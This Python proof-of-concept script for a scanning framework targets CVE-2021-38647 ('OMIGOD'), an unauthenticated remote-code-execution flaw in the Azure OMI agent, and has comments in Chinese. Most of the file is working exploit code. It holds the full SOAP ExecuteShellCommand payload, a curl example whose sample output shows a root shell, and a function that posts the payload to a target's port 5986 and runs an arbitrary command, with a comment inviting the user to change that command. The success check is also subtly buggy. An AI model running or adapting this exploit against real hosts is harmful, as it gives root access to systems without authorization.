from datetime import date
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import error, tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
import re

POC_NAME = "CVE_2021_38647_omigod"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CVE_2021_38647_omigod(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0046',    # PoC的VID编号
            'vbid': '',
            'Name': 'CVE_2021_38647_omigod',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-10-25',    # PoC创建时间
            },

        'vul': {
            'Product': '版本1.6.8.0及以下的 Open Management Infrastructure (OMI)代理',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': '未经身份验证的RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                OMI是Azure中最普遍但最不为人所知的软件代理之一，部署在Azure中的大部分Linux vm上。这些漏洞很容易被利用，允许攻击者使用单个请求远程执行网络中的任意代码，并升级为root权限。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-09-16',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }

# http_body.txt

# <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
#    ...
#    <s:Body>
#       <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
#          <p:command>id</p:command>
#          <p:timeout>0</p:timeout>
#       </p:ExecuteShellCommand_INPUT>
#    </s:Body>
# </s:Envelope>

# curl -H "Content-Type: application/soap+xml;charset=UTF-8" -k --data-binary "@http_body.txt" https://10.0.0.5:5986/wsman

# <SOAP-ENV:Envelope
#         ...
#     <SOAP-ENV:Body>
#         <p:SCX_OperatingSystem_OUTPUT
#             xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
#             <p:ReturnValue>TRUE</p:ReturnValue>
#             <p:ReturnCode>0</p:ReturnCode>
#             <p:StdOut>uid=0(root) gid=0(root) groups=0(root)&#10;</p:StdOut>
#             <p:StdErr></p:StdErr>
#         </p:SCX_OperatingSystem_OUTPUT>
#     </SOAP-ENV:Body>
# </SOAP-ENV:Envelope>

    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        headers = {'Content-Type': 'application/soap+xml;charset=UTF-8'}

        # SOAP payload from https://github.com/midoxnet/CVE-2021-38647
        DATA = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
        <s:Header>
            <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
            <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
            <a:ReplyTo>
                <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
            </a:ReplyTo>
            <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
            <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
            <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
            <w:OperationTimeout>PT1M30S</w:OperationTimeout>
            <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
            <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
            <w:OptionSet s:mustUnderstand="true" />
            <w:SelectorSet>
                <w:Selector Name="__cimnamespace">root/scx</w:Selector>
            </w:SelectorSet>
        </s:Header>
        <s:Body>
            <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
                <p:command>{}</p:command>
                <p:timeout>0</p:timeout>
            </p:ExecuteShellCommand_INPUT>
        </s:Body>
        </s:Envelope>
        """

        #resp = req(url, 'get', headers=header, allow_redirects=False)
        command = "whoami" # change the command you want to execute
        resp = requests.post(f'https://{target}:5986/wsman', headers=headers, data=DATA.format(command), verify=False)
        output = re.search('<p:StdOut>(.*)</p:StdOut>', resp.text)
        error = re.search('<p:StdErr>(.*)</p:StdErr>', resp.text)
        if output:
            if output.group(1):
                print(output.group(1).rstrip('&#10;'))
        if error:
            if error.group(1):
                print(error.group(1).rstrip('&#10;'))
        if resp.status_code == 200 and "uid" in output:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = resp.text
            if verbose:
                highlight("[+] 存在OMIGOD 未经身份验证的RCE漏洞！！！")
        else:
            if verbose:
                highlight("[+] 不存在OMIGOD 未经身份验证的RCE漏洞！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)